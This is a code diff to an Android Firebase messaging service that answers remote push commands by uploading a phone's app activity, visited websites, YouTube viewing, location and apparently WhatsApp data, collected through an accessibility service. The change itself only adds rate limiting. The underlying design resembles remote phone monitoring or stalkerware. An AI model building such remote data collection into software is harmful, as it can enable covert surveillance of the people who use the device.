@@ -26,6 +26,7 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
 
     LocationOnce L = null;
+    public static long youtubeLastSendTime = -1, webLastSendTime = -1, activityLastSendTime = -1, locationLastSendTime = -1;
     @Override
     public void onNewToken(String token) {
         Logger.l("Refreshed token: " + token);
@@ -222,13 +223,22 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                                     return null;
                                 }
                                 if(MyAccessibilityService.activities.size() > 1) {
-                                    //sendAct();
+                                    if(System.currentTimeMillis() - activityLastSendTime >= 2000) {
+                                        sendAct();
+                                        activityLastSendTime = System.currentTimeMillis();
+                                    }
                                 }
                                 if(MyAccessibilityService.webSites.size() > 1) {
-                                    sendWeb();
+                                    if(System.currentTimeMillis() - webLastSendTime >= 2000) {
+                                        sendWeb();
+                                        webLastSendTime = System.currentTimeMillis();
+                                    }
                                 }
                                 if(MyAccessibilityService.yactivities.size() > 1) {
-                                    sendYoutube();
+                                    if(System.currentTimeMillis() - youtubeLastSendTime >= 2000) {
+                                        sendYoutube();
+                                        youtubeLastSendTime = System.currentTimeMillis();
+                                    }
                                 }
 
                                 Logger.l("Activity sended");
@@ -249,13 +259,26 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
 
         if(M.get("command") != null && M.get("command").equals("sendActivity")) {
-            sendAct();
+            if(System.currentTimeMillis() - activityLastSendTime >= 2000) {
+                sendAct();
+                activityLastSendTime = System.currentTimeMillis();
+            }
         }else if(M.get("command") != null && M.get("command").equals("sendYoutube")) {
-            sendYoutube();
+            if(System.currentTimeMillis() - youtubeLastSendTime >= 2000) {
+                sendYoutube();
+                youtubeLastSendTime = System.currentTimeMillis();
+            }
         }else  if(M.get("command") != null && M.get("command").equals("sendWebsites")) {
-            sendWeb();
+            if(System.currentTimeMillis() - webLastSendTime >= 2000) {
+                sendWeb();
+                webLastSendTime = System.currentTimeMillis();
+            }
         }else  if(M.get("command") != null && M.get("command").equals("sendLocation")) {
-            GoogleService.sendNow = true;
+            if(System.currentTimeMillis() - locationLastSendTime >= 2000) {
+                GoogleService.sendNow = true;
+                locationLastSendTime = System.currentTimeMillis();
+            }
+
         }else if(M.get("command") != null && M.get("command").equals("sendWhatsapp")) {
             GoogleService.sendWhatsapp = true;
         }else{
